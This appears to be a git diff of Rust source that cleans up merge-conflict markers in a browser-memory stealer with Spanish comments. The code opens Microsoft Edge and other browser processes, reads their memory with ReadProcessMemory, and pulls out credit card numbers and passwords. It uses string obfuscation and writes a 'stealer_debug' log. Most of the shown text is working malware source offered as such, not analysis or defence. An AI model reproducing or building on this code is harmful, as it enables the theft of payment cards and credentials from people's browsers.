@@ -4,17 +4,6 @@
 use obfstr::obfstr;
 use std::mem;
 use winapi::ctypes::c_void;
-<<<<<<< HEAD
-=======
-use winapi::um::winnt::{HANDLE, PROCESS_VM_READ, PROCESS_QUERY_INFORMATION, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
-use winapi::um::processthreadsapi::OpenProcess;
-use winapi::um::handleapi::CloseHandle;
-use winapi::um::tlhelp32::{
-    CreateToolhelp32Snapshot, Process32First, Process32Next,
-    PROCESSENTRY32, TH32CS_SNAPPROCESS
-};
-use winapi::um::memoryapi::{ReadProcessMemory, VirtualQueryEx};
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 use winapi::shared::minwindef::{FALSE, LPVOID};
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::memoryapi::{ReadProcessMemory, VirtualQueryEx};
@@ -118,7 +107,6 @@ pub fn scan_all_edge_processes_for_cards() -> Vec<CreditCardData> {
     let mut all_cards = Vec::new();
     let processes = find_all_edge_processes();
 
-<<<<<<< HEAD
     log(&format!(
         "🔍 [MULTI-PROCESS SCAN] Encontrados {} procesos msedge.exe",
         processes.len()
@@ -130,41 +118,26 @@ pub fn scan_all_edge_processes_for_cards() -> Vec<CreditCardData> {
             idx + 1,
             process.pid
         ));
-=======
-    log(&format!(" [MULTI-PROCESS SCAN] Encontrados {} procesos msedge.exe", processes.len()));
-
-    for (idx, process) in processes.iter().enumerate() {
-        log(&format!("   Escaneando proceso #{} - PID: {}", idx + 1, process.pid));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         let cards = scan_edge_memory_for_cards_internal(process, &mut log);
 
         if !cards.is_empty() {
-<<<<<<< HEAD
             log(&format!(
                 "    ✅ Encontradas {} tarjetas en PID {}",
                 cards.len(),
                 process.pid
             ));
-=======
-            log(&format!("     Encontradas {} tarjetas en PID {}", cards.len(), process.pid));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             all_cards.extend(cards);
         } else {
             log(&format!("    ⏭  Sin tarjetas en PID {}", process.pid));
         }
     }
 
-<<<<<<< HEAD
     log(&format!(
         "🎯 [MULTI-PROCESS SCAN] Total: {} tarjetas encontradas en {} procesos",
         all_cards.len(),
         processes.len()
     ));
-=======
-    log(&format!(" [MULTI-PROCESS SCAN] Total: {} tarjetas encontradas en {} procesos",
-        all_cards.len(), processes.len()));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     all_cards
 }
@@ -238,7 +211,6 @@ where
                         if has_text && pages_in_region < 3 {
                             // FIX: Usar .chars() para respetar límites UTF-8
                             let safe_sample: String = sample.chars().take(60).collect();
-<<<<<<< HEAD
                             log(&format!(
                                 "        📄 Región legible - Sample: {:?}",
                                 safe_sample
@@ -248,13 +220,6 @@ where
                         if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
                             log(&format!(
                                 "      💳 Card found: {} (exp {}/{})",
-=======
-                            log(&format!("         Región legible - Sample: {:?}", safe_sample));
-                        }
-
-                        if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
-                            log(&format!("       Card found: {} (exp {}/{})",
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                                 card.card_number,
                                 card.expiry_month.unwrap_or(0),
                                 card.expiry_year.unwrap_or(0)
@@ -278,15 +243,10 @@ where
         }
 
         if !cards.is_empty() {
-<<<<<<< HEAD
             log(&format!(
                 "      Stats: {} regiones válidas, {} páginas leídas",
                 regions_valid, pages_readable
             ));
-=======
-            log(&format!("      Stats: {} regiones válidas, {} páginas leídas",
-                regions_valid, pages_readable));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         }
     }
 
@@ -312,11 +272,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
 
     let mut cards = Vec::new();
 
-<<<<<<< HEAD
     log("  🔍 [MEMORY SCAN] Iniciando escaneo...");
-=======
-    log("   [MEMORY SCAN] Iniciando escaneo...");
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     log(&format!("    PID: {}", edge.pid));
     log(&format!("    Handle: {:?}", edge.handle));
     log("    Rango: 0x00010000 - 0x7FFF0000 (empezando desde 64KB)");
@@ -367,7 +323,6 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                 let region_end = (region_start + mbi.RegionSize as usize).min(0x7FFF_0000);
                 let mut region_addr = region_start;
 
-<<<<<<< HEAD
                 log(&format!(
                     "    ✅ Región válida #{}: 0x{:08X}-0x{:08X} ({} KB)",
                     regions_valid,
@@ -375,10 +330,6 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                     region_end,
                     mbi.RegionSize / 1024
                 ));
-=======
-                log(&format!("     Región válida #{}: 0x{:08X}-0x{:08X} ({} KB)",
-                    regions_valid, region_start, region_end, mbi.RegionSize / 1024));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
                 // Escanear esta región en chunks (máximo 256 páginas por región)
                 let mut pages_in_region = 0;
@@ -402,27 +353,19 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
 
                         // Buscar patrones de números de tarjeta en memoria
                         if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
-<<<<<<< HEAD
                             log(&format!(
                                 "    ✅ Card found at address 0x{:08X}: {}",
                                 region_addr, card.card_number
                             ));
-=======
-                            log(&format!("     Card found at address 0x{:08X}: {}", region_addr, card.card_number));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                             cards.push(card);
                         }
                     } else if !first_error_logged {
                         use winapi::um::errhandlingapi::GetLastError;
                         let error_code = GetLastError();
-<<<<<<< HEAD
                         log(&format!(
                             "    ⚠️ Primer ReadProcessMemory falló - Error code: {} (0x{:X})",
                             error_code, error_code
                         ));
-=======
-                        log(&format!("     Primer ReadProcessMemory falló - Error code: {} (0x{:X})", error_code, error_code));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                         first_error_logged = true;
                     }
 
@@ -442,7 +385,6 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                 address = next_address.min(0x7FFF_0000); // No salir del rango user-mode
 
                 if regions_checked < 10 {
-<<<<<<< HEAD
                     log(&format!(
                         "    ⏭️  Región inválida: 0x{:08X} (State={:X}, Protect={:X}, Size={} KB)",
                         address,
@@ -450,10 +392,6 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                         mbi.Protect,
                         mbi.RegionSize / 1024
                     ));
-=======
-                    log(&format!("    ⏭  Región inválida: 0x{:08X} (State={:X}, Protect={:X}, Size={} KB)",
-                        address, mbi.State, mbi.Protect, mbi.RegionSize / 1024));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
                 }
             }
 
@@ -463,11 +401,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
             }
         }
 
-<<<<<<< HEAD
         log(&format!("  📊 [MEMORY SCAN] Estadísticas:"));
-=======
-        log(&format!("   [MEMORY SCAN] Estadísticas:"));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         log(&format!("    Regiones verificadas: {}", regions_checked));
         log(&format!(
             "    Regiones válidas (COMMIT+readable): {}",
@@ -502,17 +436,12 @@ fn search_credit_card_pattern(buffer: &[u8]) -> Option<CreditCardData> {
         // Log para debug
         use std::io::Write;
         let debug_path = std::env::temp_dir().join("stealer_debug.txt");
-<<<<<<< HEAD
         if let Ok(mut file) = std::fs::OpenOptions::new()
             .create(true)
             .append(true)
             .open(&debug_path)
         {
             let _ = writeln!(file, "        🔍 DEBUG: Encontrado '4111' en memoria!");
-=======
-        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(&debug_path) {
-            let _ = writeln!(file, "         DEBUG: Encontrado '4111' en memoria!");
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             // Extraer contexto (50 chars antes y después)
             if let Some(pos) = text.find("4111") {
@@ -572,14 +501,7 @@ fn search_credit_card_pattern(buffer: &[u8]) -> Option<CreditCardData> {
 
 /// Valida número de tarjeta usando algoritmo de Luhn
 fn validate_luhn(card_number: &str) -> bool {
-<<<<<<< HEAD
     let digits: Vec<u32> = card_number.chars().filter_map(|c| c.to_digit(10)).collect();
-=======
-    let digits: Vec<u32> = card_number
-        .chars()
-        .filter_map(|c| c.to_digit(10))
-        .collect();
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     if digits.is_empty() {
         return false;
@@ -728,7 +650,6 @@ pub fn scan_all_browser_processes_for_passwords(browser_name: &str) -> Vec<Passw
         return all_passwords;
     };
 
-<<<<<<< HEAD
     log(&format!(
         "🔍 [PASSWORD SCAN] Buscando procesos {}...",
         process_name
@@ -746,40 +667,23 @@ pub fn scan_all_browser_processes_for_passwords(browser_name: &str) -> Vec<Passw
             idx + 1,
             process.pid
         ));
-=======
-    log(&format!(" [PASSWORD SCAN] Buscando procesos {}...", process_name));
-
-    let processes = find_processes_by_name(&process_name);
-    log(&format!(" [PASSWORD SCAN] Encontrados {} procesos", processes.len()));
-
-    for (idx, process) in processes.iter().enumerate() {
-        log(&format!("   Escaneando proceso #{} - PID: {}", idx + 1, process.pid));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         let passwords = scan_memory_for_passwords_internal(process, &mut log);
 
         if !passwords.is_empty() {
-<<<<<<< HEAD
             log(&format!(
                 "    ✅ Encontrados {} passwords en PID {}",
                 passwords.len(),
                 process.pid
             ));
-=======
-            log(&format!("     Encontrados {} passwords en PID {}", passwords.len(), process.pid));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             all_passwords.extend(passwords);
         }
     }
 
-<<<<<<< HEAD
     log(&format!(
         "🎯 [PASSWORD SCAN] Total: {} passwords encontrados",
         all_passwords.len()
     ));
-=======
-    log(&format!(" [PASSWORD SCAN] Total: {} passwords encontrados", all_passwords.len()));
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
     all_passwords
 }
@@ -816,15 +720,7 @@ fn find_processes_by_name(process_name: &str) -> Vec<EdgeProcess> {
             if current_name == process_name.to_lowercase() {
                 let pid = entry.th32ProcessID;
 
-<<<<<<< HEAD
                 let handle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
-=======
-                let handle = OpenProcess(
-                    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
-                    FALSE,
-                    pid
-                );
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
                 if !handle.is_null() {
                     processes.push(EdgeProcess {
@@ -873,13 +769,8 @@ where
                 continue;
             }
 
-<<<<<<< HEAD
             let is_readable =
                 (mbi.Protect & PAGE_READONLY != 0) || (mbi.Protect & PAGE_READWRITE != 0);
-=======
-            let is_readable = (mbi.Protect & PAGE_READONLY != 0)
-                || (mbi.Protect & PAGE_READWRITE != 0);
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
             if mbi.State == MEM_COMMIT && is_readable && mbi.RegionSize > 0 {
                 let region_start = address;
